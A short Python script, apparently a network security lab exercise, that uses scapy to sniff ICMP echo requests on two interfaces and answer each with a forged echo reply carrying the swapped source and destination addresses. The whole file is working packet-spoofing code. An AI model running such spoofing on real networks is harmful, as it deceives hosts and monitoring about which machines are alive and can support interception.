from scapy.all import *

def sendAndspoof(pkt):
	if (pkt[2].type == 8): #we want to catch icmp packet
		source= pkt[1].src
		dest= pkt[1].dst
		seq_num = pkt[2].seq
		id = pkt[2].id
		lo = pkt[3].load
		#flipping the request and replay 
		print(f"First : source {source} dest {dest} icmp echo ping(8)")
		print(f"Secound : source {dest} dest {source} icmp echo ping replay (0)")
		a= IP(src= dest, dst=source)
		b = ICMP(type=0 , id=id, seq=seq_num)
		ans=a/b/lo
		send(ans,verbose=0)

interfaces = ['enp0s3','lo']
pkt = sniff(iface=interfaces, filter = 'icmp', prn=sendAndspoof) 
